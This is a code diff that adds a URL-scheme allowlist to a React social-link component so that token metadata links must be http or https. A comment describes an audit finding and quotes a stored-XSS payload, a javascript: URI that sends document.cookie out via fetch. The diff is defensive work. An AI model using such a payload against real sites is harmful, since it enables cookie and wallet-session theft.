@@ -443,9 +443,30 @@ function Stat({ label, value, hint }: { label: string; value: string; hint?: str
   );
 }
 
+/** Scheme allowlist for any href that comes from user-controlled token
+ *  metadata. React does NOT block `javascript:` URIs in `href` in
+ *  production builds (only emits a dev-mode warning) - audit FSEC-001
+ *  walked the exploit path: attacker pins IPFS JSON with
+ *  `{"twitter":"javascript:fetch(...+document.cookie)"}` -> any visitor
+ *  who clicks the Twitter pill executes attacker JS in the arcade.trading
+ *  origin, with wallet state in reach. Returning null when the parsed
+ *  URL isn't http(s) hides the pill entirely - safer than rendering an
+ *  inert anchor that still gets click-handlers in dev tools. */
+function safeMetadataHref(href: string | undefined): string | null {
+  if (!href) return null;
+  try {
+    const u = new URL(href);
+    return u.protocol === "https:" || u.protocol === "http:" ? href : null;
+  } catch {
+    return null;
+  }
+}
+
 function SocialLink({ href, icon, children }: { href: string; icon: React.ReactNode; children: React.ReactNode }) {
+  const safe = safeMetadataHref(href);
+  if (!safe) return null;
   return (
-    <a href={href} target="_blank" rel="noopener noreferrer" className="arc-pill hover:bg-arc-surface-3">
+    <a href={safe} target="_blank" rel="noopener noreferrer" className="arc-pill hover:bg-arc-surface-3">
       {icon}
       {children}
     </a>
